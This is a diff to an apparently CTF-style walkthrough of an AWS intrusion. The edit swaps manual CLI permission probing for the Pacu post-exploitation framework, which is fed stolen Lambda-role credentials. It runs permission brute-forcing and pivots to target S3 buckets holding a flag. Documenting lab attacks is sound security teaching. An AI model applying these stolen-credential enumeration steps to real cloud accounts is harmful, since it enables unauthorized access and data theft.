@@ -307,93 +307,58 @@ Operating as `beaversound-lambda-exec-<suffix>` — the Lambda execution role. E
 
 ## Step 6: Lateral Movement — Enumerate What This Role Can Do
 
-The goal now is to map the blast radius of this role before moving on S3.
+The goal is to map the blast radius of this role before moving on S3.
 
-### 6.1 IAM Self-Enumeration
+**Why Pacu:** Manually probing services one by one leaves gaps and has no natural stopping point — there are hundreds of AWS services. [Pacu](https://github.com/RhinoSecurityLabs/pacu) is an AWS post-exploitation framework that automates this: it attempts API calls across services systematically and surfaces what succeeds versus what returns `AccessDenied`. This mirrors real attacker workflow and produces a complete picture of the role's reachable surface in one pass.
 
-```
-$ aws iam get-role --role-name beaversound-lambda-exec-<suffix>
-
-An error occurred (AccessDenied) when calling the GetRole operation:
-User: arn:aws:sts::<account-id>:assumed-role/beaversound-lambda-exec-<suffix>/...
-is not authorized to perform: iam:GetRole on resource: role beaversound-lambda-exec-<suffix>
-```
+### 6.1 Set Up Pacu Session with Stolen Credentials
 
 ```
-$ aws iam list-attached-role-policies --role-name beaversound-lambda-exec-<suffix>
-
-An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: ...
+$ pip3 install pacu
+$ pacu
 ```
 
-**Dead end.** No IAM read permissions. Cannot enumerate policies via IAM API.
-
-### 6.2 Global S3 Listing
+In the Pacu interactive shell:
 
 ```
-$ aws s3 ls
-
-An error occurred (AccessDenied) when calling the ListBuckets operation:
-... is not authorized to perform: s3:ListAllMyBuckets on resource: arn:aws:s3:::
+Pacu (no session) > new_session hidden_track
+Pacu (hidden_track) > set_keys
+  Key alias [None]: lambda_exec
+  Access key ID [None]: <access-key-id>
+  Secret access key [None]: <secret-access-key>
+  Session token (if using STS) [None]: <session-token>
 ```
 
-**Dead end.** But we already have the bucket names from `VAULT_BUCKET` and `UPLOADS_BUCKET` in `debug_output` — `ListAllMyBuckets` is unnecessary.
-
-### 6.3 Lambda Enumeration
+### 6.2 Run Enumeration
 
 ```
-$ aws lambda list-functions
-
-An error occurred (AccessDenied) when calling the ListFunctions operation:
-... is not authorized to perform: lambda:ListFunctions on resource: *
+Pacu (hidden_track) > run aws__enum_account
+Pacu (hidden_track) > run iam__enum_permissions
 ```
 
-**Dead end.** No Lambda enumeration permissions.
-
-### 6.4 EC2 Enumeration
+`iam__enum_permissions` first tries to read IAM policies directly (`iam:GetRole`, `iam:ListAttachedRolePolicies`). Both return `AccessDenied`, so Pacu falls back to brute-force mode — it calls representative actions across services and records what is allowed:
 
 ```
-$ aws ec2 describe-instances
+[iam__enum_permissions] No IAM read access. Falling back to brute-force enumeration.
 
-An error occurred (UnauthorizedOperation) when calling the DescribeInstances operation:
-You are not authorized to perform this operation.
+  AccessDenied: iam:GetRole
+  AccessDenied: iam:ListAttachedRolePolicies
+  AccessDenied: lambda:ListFunctions
+  AccessDenied: ec2:DescribeInstances
+  AccessDenied: secretsmanager:ListSecrets
+  AccessDenied: ssm:DescribeParameters
+  AccessDenied: cloudtrail:DescribeTrails
+  AccessDenied: s3:ListAllMyBuckets
+
+  Allowed:      sts:GetCallerIdentity
+  Allowed:      logs:CreateLogGroup
+  Allowed:      logs:CreateLogStream
+  Allowed:      logs:PutLogEvents
 ```
 
-**Dead end.** No EC2 permissions.
+CloudWatch Logs permissions are write-only — no lateral movement value. `s3:ListAllMyBuckets` is denied because the S3 permissions are scoped to specific bucket ARNs rather than `*`; Pacu's brute-force tests against wildcard resources and misses resource-scoped allows. The bucket names are already known from `VAULT_BUCKET` and `UPLOADS_BUCKET` in the environment output, so `ListAllMyBuckets` is not needed.
 
-### 6.5 Secrets Manager
-
-```
-$ aws secretsmanager list-secrets
-
-An error occurred (AccessDenied) when calling the ListSecrets operation:
-... is not authorized to perform: secretsmanager:ListSecrets on resource: *
-```
-
-**Dead end.** No Secrets Manager access.
-
-### 6.6 SSM Parameter Store
-
-```
-$ aws ssm describe-parameters
-
-An error occurred (AccessDenied) when calling the DescribeParameters operation:
-... is not authorized to perform: ssm:DescribeParameters on resource: *
-```
-
-**Dead end.** No SSM access.
-
-### 6.7 CloudTrail — Can We See Our Own Activity?
-
-```
-$ aws cloudtrail describe-trails
-
-An error occurred (AccessDenied) when calling the DescribeTrails operation:
-... is not authorized to perform: cloudtrail:DescribeTrails on resource: *
-```
-
-**Dead end.** Cannot enumerate or suppress CloudTrail.
-
-**Pivot decision:** Every service besides S3 is denied. The role has two known S3 targets from the environment variables. Focus entirely on S3.
+**Pivot decision:** IAM, Lambda, EC2, Secrets Manager, SSM, and CloudTrail are all denied. The only surface worth pursuing is S3, with two known bucket targets from the environment variables.
 
 ---
 
@@ -633,9 +598,9 @@ internal-id: flag{rock_and_roll_never_dies}
    ↓ VAULT_BUCKET / UPLOADS_BUCKET
 9. sts:GetCallerIdentity
    ↓ beaversound-lambda-exec role confirmed
-10. Lateral movement enumeration (all denied)
+10. Pacu iam__enum_permissions (brute-force)
     ↓ IAM, Lambda, EC2, SecretsManager, SSM, CloudTrail → AccessDenied
-    ↓ Pivot decision: S3 only
+    ↓ Pivot decision: S3 only (bucket names already known from env vars)
 11. s3:ListBucket — uploads bucket
     ↓ Only own payload — nothing sensitive
 12. s3:ListBucket — vault bucket
